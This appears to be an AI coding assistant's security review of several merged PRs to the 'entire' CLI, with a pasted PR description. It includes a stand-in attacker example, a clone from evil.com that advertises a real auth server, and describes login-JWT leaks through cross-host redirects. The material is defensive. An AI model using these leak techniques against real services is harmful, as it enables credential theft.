`Read()` is a **Claude Code permission-rule matcher**, nothing to do with your diff. Your project settings have one:

```json
// .claude/settings.json
"permissions": { "deny": ["Read(./.entire/metadata/**)"] }
```

That denies reads of `.entire/metadata/**` — the raw session transcripts. Two things about it explain the prompt you just saw:

1. **File-path rules apply to Bash too, not just the `Read` tool.** `grep`, `cat`, `sed`, `head` are all checked against `Read()` rules, which is why a `grep` triggered a rule whose name says "Read". The denial message telling me about a `Read()` rule in response to a `grep` is itself the proof of that coupling.
2. **It fails closed when the path can't be resolved statically.** My command was `cd /private/tmp/.../prs && grep -n ... 2235.diff` — a bare relative filename whose meaning depends on a `cd` earlier in the same chain. The harness can't prove `2235.diff` lands outside `./.entire/metadata/**` without executing the `cd` first, so instead of guessing it asked. Not a match against the rule — an *unprovable* non-match.

So it was my command shape, not the file. My fault: the Bash tool docs warn that `cd` in a compound command can trigger a prompt, and I used it three times. Absolute paths avoid it entirely, which is what I'll use from here.

Resuming the review of #2235.

## Why

With two saved logins and the active one on the wrong federation, git against the other one dead-ended:

```
$ git clone entire://royalcanin.partial.to/et/dogfooding/canary
fatal: cluster royalcanin.partial.to does not accept your active login
```

...even though exactly one saved login could authenticate it, and the error said so. Partial revert of https://github.com/entireio/cli/pull/1982.

## What

Restores the two tiers under the active context: **sole eligible saved login → use it**; several eligible → ambiguity error naming them. It now says which one acted, on stderr:

```
Using context 'eu.auth.partial.to'.
```

`--context` / `$ENTIRE_CONTEXT` are untouched, and an explicit one the host rejects stays a hard error — you asked for that identity by name. Nothing else from https://github.com/entireio/cli/pull/1982 is reverted.

# Security

**The hole.** `git-remote-entire` sends your login JWT as the bearer to the cluster. Which saved login it sends is decided by the cluster's own `/.well-known/entire-cluster.json`: the `core_urls` list names the login servers it accepts. That is self-reported. A hostile host can advertise a login server it does not own:

```
$ git clone entire://anything.evil.com/x/y
# evil.com serves: {"core_urls": ["https://au.auth.entire.io"]}
```

...and the CLI hands evil.com a real `au.auth.entire.io` token. This predates this PR and applies to every selection tier — explicit `--context`, the active context, and `ENTIRE_TOKEN` — not just the restored auto-select. Auto-select widens the blast radius because the attacker no longer needs the victim's *active* login to be the one they name; any saved login will do.

**Mitigation 1 — same-domain gate (all tiers, all paths).** Every advertised login server must share the target host's registrable domain (eTLD+1 via `golang.org/x/net/publicsuffix`, so `evil.co.uk` cannot match `acme.co.uk`). `evil.com` may only nominate `*.evil.com`. A mismatch is a hard error naming both hosts, never a silent filter. Enforced where the discovery result is read, so it covers the git cluster path, the data-API path, `ENTIRE_TOKEN`, and a poisoned cache entry.

**Mitigation 2 — auto-select allowlist (auto-select tier only).** A saved login is auto-selected only when the target's registrable domain is one of `entire.io`, `partial.to`, `localhost`. Hardcoded. Anything else gets today's "switch with `entire auth use`" error. Explicit and active-context selection are not gated by this — a self-hosted cluster that passes mitigation 1 still works when you name the login.

**This allowlist is an interim solution.** We are not inventing an extensible trust mechanism until a self-hosted deployment needs auto-select. If and when that happens, it gets designed properly rather than bolted on here.

Repo worktree is back to its original clean state. Here's the review.

## What merged overnight

| PR | Author | Area |
|---|---|---|
| [#2222](https://github.com/entireio/cli/pull/2222) | jagregory | experts: resolve repo id from placement cell resolution |
| [#2208](https://github.com/entireio/cli/pull/2208) | toothbrush | top-level `entire clone` |
| [#2248](https://github.com/entireio/cli/pull/2248) | toothbrush | partial revert: auto-select the sole eligible login |
| [#2235](https://github.com/entireio/cli/pull/2235) | toothbrush | coreapi: delegate cross-jurisdiction transport to auth-go |

Dependency delta is first-party only (`auth-go` bump); no third-party module entered `go.sum`, so no external CVE surface.

## Finding: #2235 silently reverted #2224's token-leak guard

**#2224** (merged 15:41Z) added `rejectCrossHostRedirect` to `httputil.PostOAuthToken` because Go's client strips the `Authorization` *header* on a cross-host redirect but copies the POST *body* unconditionally — and the body carries `subject_token`, the user's login JWT.

**#2235** (merged 04:02Z, ~12 h later) deleted the transport that called it. The old code exchanged via `httputil.PostOAuthToken` (visible at line 1098 of the deleted `cross_juris_transport.go`); the replacement routes through `auth-go`'s `crossjuris` → `sts.Client.Exchange` → `oauthhttp.HTTPClient`, which is:

```go
return &http.Client{Transport: transport}   // internal/oauthhttp/httpclient.go
```

No `CheckRedirect`. `grep -rn CheckRedirect` across the whole auth-go module returns nothing.

I reproduced it against the exact pinned version, driving `crossjuris.Transport` with the same config `internal/coreapi/cross_juris_client.go:43` sets (`ClientID` set, `AllowInsecureHTTP: false`, TLS base — the production settings, not a loopback allowance):

```
crossjuris.go:129: 401 from https://127.0.0.1:65378: exchanged login JWT, retrying
e2e_test.go:72: LEAK: login JWT reached https://127.0.0.1:65377 via the exchange POST redirect
```

The token endpoint answered `307` and the login JWT was replayed to a third host. It fails in both directions: `crossjuris` also accepted the attacker's `access_token` from that response, cached it per-origin, and presented it to the real core.

**Severity, stated fairly.** This is defence-in-depth, not a broken boundary. `validateExchangeURL` still requires the exchange URL to be same-host with the 401, https, and path exactly `/oauth/token` — so the first hop is a core that legitimately receives the token anyway. What the guard buys is the second hop: an open redirect, a misconfigured proxy or CDN in front of a trusted core, or a federated peer forwarding onward. That was #2224's own stated justification, so the bar was already set here and this path now sits below it.

**What makes it likely to stay broken:** #2224's regression test lives in `httputil/oauth_test.go`, so it still passes while the other exchange path is unguarded. The CLI is now split — `cmd/entire/cli/auth/cell_data_api.go:685` (identity-token exchange) still uses the guarded helper; `internal/coreapi` does not.

**Fix:** upstream, in auth-go's `oauthhttp.HTTPClient` — set `CheckRedirect` there and it covers `sts` and every other OAuth caller at once. The guard is ~10 lines and already written twice in this repo. A test at the `crossjuris`/`coreapi` layer, not just `httputil`, is what pins it.

## #2248 — sound, and it closes a real pre-existing hole

Worth saying plainly: this PR found and fixed a genuine token-leak vector that predated it (a hostile host self-reporting `core_urls` and being handed a real `entire.io` token). I checked the two mitigations rather than taking the description at face value:

- **Same-domain gate is a true chokepoint.** `requireSameSiteIssuers` sits in `resolveCachedCores` (`resolve.go:187`, `:202`, `:210`) — fresh, stale-fallback, and pre-cache-write. I traced the `ENTIRE_TOKEN` path (`git-remote-entire/main.go:419` → `ResolveClusterCores` → `resolveClusterCores` → `resolveCachedCores`) and it is covered as claimed. No `Discover*` caller bypasses it.
- **No parser differential**, which is the bypass shape I went looking for. The gate reads `url.Parse(s).Host`; eligibility (`contextEligible`) compares the *same string* byte-for-byte against the saved `CoreURL`. So a `https://au.auth.entire.io@evil.com` style entry can pass the gate only by being a string that no saved login will ever match. Getting these two to agree on the same input is the thing that usually goes wrong here, and it doesn't.
- **Allowlist is exact eTLD+1 equality**, not a suffix match, so `evil-entire.io` doesn't slip through.

One residual assumption to confirm, not a defect: the gate's granularity is eTLD+1, so every subdomain of `entire.io` and `partial.to` is mutually trusted. Given `royalcanin.partial.to` / `eukanuba.partial.to` are customer-*named* clusters, the security rests on all of them being Entire-operated. If a customer can ever point DNS they control at a `*.partial.to` name, that host could nominate the real staging auth server and tier 3 would hand over a token with only a stderr notice. Also `JurisdictionCoreURL` is returned ungated in a public struct, held back only by a comment saying nothing dials it yet (`resolve.go:149`) — true today, verified.

## #2222 and #2208 — clear

**#2222** removes `resolveExpertsRepoID`, whose doc called it "authz-safe" because it filtered against the caller's accessible-repo list. That isn't a real loss: the ULID branch always passed the raw id straight through, so the filter was never a boundary, and authorization is the cell's to enforce on `POST /repos/{id}/experts`. The replacement resolves through the caller-scoped control-plane index and validates the returned `FullName` matches. The `strings.ToUpper` on the ULID (`experts_cmd.go`) is a fix, and the value is `url.PathEscape`d.

Pre-existing nit, unrelated to this PR: `looksLikeULID` checks `len(s) != 26` in **bytes** then folds case, so 13 × `ſ` (U+017F, 2 bytes each) uppercases to `SSSSSSSSSSSSS` and passes. Harmless — everything downstream is path-escaped — but the length check wants to be over runes.

**#2208** is low-risk. `exemptFromEntireDirCheck` on the new top-level `clone` matches the existing exemption on the `repo` group, so it's not new reach. Cosmetic only: `repo clone --help` now prints examples spelled `entire clone`.
